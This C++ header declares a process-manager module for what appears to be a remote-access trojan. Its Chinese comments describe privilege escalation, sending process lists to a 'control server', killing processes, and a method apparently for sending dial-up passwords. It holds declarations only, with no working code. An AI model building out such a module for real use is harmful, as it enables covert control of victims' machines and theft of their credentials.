// CProcessManager.h: interface for the CProcessManager class.
//
//////////////////////////////////////////////////////////////////////

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
class CProcessManager : public CManager
{
	public:
		CProcessManager(CClientSocket* pClient, BYTE bHow);//bHow是传进来功能的标志
		virtual ~CProcessManager();
		virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

		//提权
		static bool DebugPrivilege(const char* PName, BOOL bEnable);
	private:
		BYTE m_caseSystemIs;//构造函数会初始化这个变量，用于区分进程或者窗口的变量

		//获取进程的完整路径
		BOOL GetProcessFullPath(DWORD dwPID, TCHAR pszFullPath[MAX_PATH]);
		BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath);

		//遍历进程，获取进程的数据写入申请的内存空间
		LPBYTE getProcessList();
		//发送获取的进程数据到控制服务端
		void SendProcessList();;
		void SendDialupassList();

		//根据pid来杀死进程
		void KillProcess(LPBYTE lpBuffer, UINT nSize);


};

